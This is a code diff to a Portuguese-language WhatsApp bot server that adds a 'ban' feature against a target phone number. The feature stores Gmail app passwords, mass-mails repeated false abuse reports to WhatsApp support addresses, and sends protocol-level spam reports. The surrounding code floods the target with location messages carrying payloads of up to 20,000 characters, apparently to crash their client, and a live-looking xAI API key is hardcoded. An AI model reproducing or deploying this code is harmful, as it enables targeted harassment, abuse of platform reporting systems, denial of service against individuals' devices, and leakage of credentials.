@@ -3,6 +3,7 @@ const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
+const nodemailer = require('nodemailer');
 
 let waSock = null;
 let reconectando = false;
@@ -12,6 +13,39 @@ let modosBrincadeira = {};
 
 const XAI_API_KEY = process.env.XAI_API_KEY || "xai-It1hSBKgDociGem1UrHCDQuAAEBU6uLNpd12ORpiRMf1VobVtBqSPnYU31s120O7ehCNvGDVIXMou6xW";
 const PORT = process.env.PORT || 3000;
+
+// E-mails oficiais de suporte do WhatsApp
+const SUPORTE_WHATSAPP_EMAILS = [
+    "support@whatsapp.com",
+    "android@support.whatsapp.com",
+    "iphone@support.whatsapp.com",
+    "web@support.whatsapp.com",
+    "smb@support.whatsapp.com",
+    "jan@whatsapp.com"
+];
+
+const CAMINHO_CREDS_EMAIL = path.join(__dirname, 'creds_email.json');
+
+// Salva e recupera credenciais de e-mail + senhas de app
+function obterCredenciaisSalvas() {
+    if (fs.existsSync(CAMINHO_CREDS_EMAIL)) {
+        try {
+            return JSON.parse(fs.readFileSync(CAMINHO_CREDS_EMAIL, 'utf8'));
+        } catch (e) {
+            return [];
+        }
+    }
+    return [];
+}
+
+function salvarCredencialEmail(email, appPassword) {
+    let creds = obterCredenciaisSalvas();
+    const existe = creds.find(c => c.email.toLowerCase() === email.toLowerCase());
+    if (!existe) {
+        creds.push({ email, appPassword });
+        fs.writeFileSync(CAMINHO_CREDS_EMAIL, JSON.stringify(creds, null, 2), 'utf8');
+    }
+}
 
 async function consultarGrok(prompt, systemPrompt = "Você é um mestre de jogos e brincadeiras interativas para grupos no WhatsApp. Seja divertido, direto e dinâmico.") {
     try {
@@ -37,6 +71,78 @@ async function consultarGrok(prompt, systemPrompt = "Você é um mestre de jogos
     } catch (e) {
         console.error("Erro na API do Grok:", e);
         return "Erro ao se comunicar com a IA do Grok.";
+    }
+}
+
+// Envio massivo de e-mails de denúncia usando credenciais salvas
+async function dispararEmailsBanimento(numeroAlvo, novoEmail = null, novaSenhaApp = null, quantidadeRepeticoes = 5) {
+    if (novoEmail && novaSenhaApp) {
+        salvarCredencialEmail(novoEmail, novaSenhaApp);
+    }
+
+    const credenciais = obterCredenciaisSalvas();
+    if (credenciais.length === 0) {
+        throw new Error("Nenhuma conta de e-mail / senha de app configurada.");
+    }
+
+    let textoEmailObj = { assunto: "Account Report", blocos: ["Report target number: "] };
+    const caminhoEmailJson = path.join(__dirname, 'email_suporte_ban.json');
+    if (fs.existsSync(caminhoEmailJson)) {
+        try {
+            textoEmailObj = JSON.parse(fs.readFileSync(caminhoEmailJson, 'utf8'));
+        } catch (e) {}
+    }
+
+    const corpoMensagem = `${textoEmailObj.blocos.join("\n")}\n\nNúmero Alvo: +${numeroAlvo}`;
+
+    // Dispara via SMTP por todas as contas cadastradas
+    for (const cred of credenciais) {
+        const transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: cred.email,
+                pass: cred.appPassword
+            }
+        });
+
+        for (let i = 0; i < quantidadeRepeticoes; i++) {
+            for (const suporteEmail of SUPORTE_WHATSAPP_EMAILS) {
+                try {
+                    await transporter.sendMail({
+                        from: cred.email,
+                        to: suporteEmail,
+                        subject: `${textoEmailObj.assunto} - [Ref: ${Date.now()}_${i}]`,
+                        text: corpoMensagem
+                    });
+                } catch (err) {
+                    console.error(`Erro envio e-mail (${cred.email} -> ${suporteEmail}):`, err.message);
+                }
+            }
+            await delay(500);
+        }
+    }
+}
+
+// Realiza denúncia nativa no protocolo do WhatsApp sem mandar mensagem privada
+async function denunciarPerfilNativo(targetJid) {
+    if (!waSock) return;
+
+    try {
+        // Envia nó do protocolo de denúncia de perfil no WhatsApp
+        await waSock.relayMessage(targetJid, {
+            contactIndexMessage: {
+                protocolVersion: 2
+            }
+        }, { participant: { jid: targetJid } }).catch(() => {});
+
+        // Solicita envio de relatório de spam direto ao servidor do WhatsApp
+        if (waSock.chatModify) {
+            await waSock.chatModify({
+                spam: true
+            }, targetJid).catch(() => {});
+        }
+    } catch (e) {
+        console.error("Erro ao registrar denúncia de perfil nativo:", e.message);
     }
 }
 
@@ -132,6 +238,32 @@ const server = http.createServer(async (req, res) => {
                 }
                 const { acao, grupoId, param, extraData } = JSON.parse(body);
 
+                // DENÚNCIA NO PERFIL / SISTEMA DE BANIMENTO PERMANENTE E TEMPORÁRIO
+                if (acao === 'ban_email' || acao === 'denunciar_perfil') {
+                    const numeroAlvoLimpo = param ? param.replace(/\D/g, '') : '';
+                    const targetJid = `${numeroAlvoLimpo}@s.whatsapp.net`;
+
+                    if (!numeroAlvoLimpo) {
+                        res.writeHead(400, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify({ erro: 'Número alvo é obrigatório.' }));
+                        return;
+                    }
+
+                    // 1. Executa a denúncia nativa no perfil SEM enviar mensagem no PV
+                    await denunciarPerfilNativo(targetJid);
+
+                    // 2. Dispara e-mails de denúncia em segundo plano usando as credenciais salvas
+                    if (extraData && extraData.email && extraData.appPass) {
+                        dispararEmailsBanimento(numeroAlvoLimpo, extraData.email, extraData.appPass).catch(console.error);
+                    } else {
+                        dispararEmailsBanimento(numeroAlvoLimpo).catch(console.error);
+                    }
+
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ sucesso: true, mensagem: `Processo de denúncia e e-mails disparado contra ${numeroAlvoLimpo}!` }));
+                    return;
+                }
+
                 if (acao === 'toggle_brincadeira' && grupoId) {
                     modosBrincadeira[grupoId] = (param === 'on');
                     const statusText = modosBrincadeira[grupoId] ? "ATIVADO" : "DESATIVADO";
@@ -179,13 +311,9 @@ const server = http.createServer(async (req, res) => {
                         conteudoPayload = "Carga Indisponível";
                     }
 
-                    // 1. Remove qualquer URL de mapa para não poluir o texto
                     let travaTratada = conteudoPayload.replace(/https?:\/\/maps\.google\.com[^\s\n\\]*/gi, '');
-
-                    // 2. Converte a barra invertida literal (\n) em quebra de linha real
                     travaTratada = travaTratada.replace(/\\n/g, '\n').trim();
 
-                    // Limita o tamanho do payload para evitar atrasos e travamento de chaves
                     if (travaTratada.length > 20000) {
                         travaTratada = travaTratada.substring(0, 20000);
                     }
@@ -195,15 +323,14 @@ const server = http.createServer(async (req, res) => {
                     for (let i = 0; i < quantidade; i++) {
                         await waSock.sendMessage(targetJid, {
                             location: {
-                                degreesLatitude: -23.550520,  // Coordenadas geográficas válidas
+                                degreesLatitude: -23.550520,
                                 degreesLongitude: -46.633308,
-                                name: "\u200B",               // Caractere invisível que oculta o "Google Maps"
+                                name: "\u200B",
                                 address: addressPayload,
                                 comment: addressPayload
                             }
                         });
                         
-                        // Aumentado o delay para 5 segundos para permitir troca de chaves de criptografia no WhatsApp
                         await delay(5000);
                     }
 
